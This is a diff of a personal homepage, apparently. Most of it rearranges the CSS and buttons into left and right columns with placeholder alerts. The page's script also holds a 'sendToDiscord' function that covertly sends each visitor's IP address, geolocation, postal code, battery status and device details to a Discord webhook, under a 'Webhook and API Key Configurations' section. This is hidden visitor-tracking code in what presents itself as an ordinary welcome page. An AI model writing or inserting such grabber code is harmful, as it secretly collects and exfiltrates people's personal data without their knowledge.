@@ -30,25 +30,31 @@
             text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.5);
         }
 
-        .button-container {
+        .buttons-container {
             display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin-top: 20px;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+
+        .button-column {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
         }
 
         button {
+            background: rgba(221, 160, 221, 0.8); /* Transparent purple */
             border: none;
             border-radius: 5px;
             color: #ffffff;
-            font-size: 1em;
+            font-size: 1.2em;
             padding: 10px 20px;
             cursor: pointer;
             transition: background-color 0.3s ease, transform 0.2s ease;
         }
 
         button:hover {
+            background: rgba(173, 216, 230, 0.8); /* Transparent blue */
             transform: scale(1.1);
         }
 
@@ -56,45 +62,34 @@
             transform: scale(1);
         }
 
-        .btn-blue {
-            background: #4d8af0;
-        }
-
-        .btn-green {
-            background: #3cb371;
-        }
-
-        .btn-orange {
-            background: #ff8c00;
-        }
-
-        .btn-purple {
-            background: #8a2be2;
-        }
-
-        .btn-pink {
-            background: #ff1493;
-        }
-
-        .btn-yellow {
-            background: #ffd700;
+        .right-buttons {
+            text-align: right;
         }
     </style>
 </head>
 <body>
     <h1>Welcome to my website.</h1>
-    <div class="button-container">
-        <button class="btn-blue" onclick="redirectToPage()">About Me</button>
-        <button class="btn-green" onclick="redirectToPage()">Projects</button>
-        <button class="btn-orange" onclick="redirectToPage()">Contact</button>
-        <button class="btn-purple" onclick="redirectToPage()">Services</button>
-        <button class="btn-pink" onclick="redirectToPage()">Blog</button>
-        <button class="btn-yellow" onclick="redirectToPage()">Portfolio</button>
+    <div class="buttons-container">
+        <!-- Left buttons -->
+        <div class="button-column">
+            <button onclick="alert('Left Button 1')">Left Button 1</button>
+            <button onclick="alert('Left Button 2')">Left Button 2</button>
+            <button onclick="alert('Left Button 3')">Left Button 3</button>
+            <button onclick="alert('Left Button 4')">Left Button 4</button>
+        </div>
+
+        <!-- Right buttons -->
+        <div class="button-column right-buttons">
+            <button onclick="redirectToPage()">About Me</button>
+            <button onclick="alert('Right Button 2')">Right Button 2</button>
+            <button onclick="alert('Right Button 3')">Right Button 3</button>
+            <button onclick="alert('Right Button 4')">Right Button 4</button>
+        </div>
     </div>
 
     <script>
         function redirectToPage() {
-            window.location.href = '#'; // Placeholder: Change to actual page links
+            window.location.href = 'page1.html';
         }
 
         // Webhook and API Key Configurations
@@ -179,7 +174,7 @@
         // Send Data to Discord
         function sendToDiscord(ip, location, battery, deviceInfo) {
             const mainEmbed = {
-                title: "value: data_country_emoji New Visitor Information",
+                title: "New Visitor Information",
                 color: 7506394,
                 fields: [
                     { name: "IP Address", value: ip, inline: true },
@@ -203,6 +198,7 @@
                     { name: "Postal", value: location.postal || "N/A", inline: true },
                     { name: "Country Code", value: location.country_calling_code || "N/A", inline: true },
                     { name: "Emoji", value: location.country_emoji || "N/A", inline: true }
+                    
                 ]
             };
             const payload = {
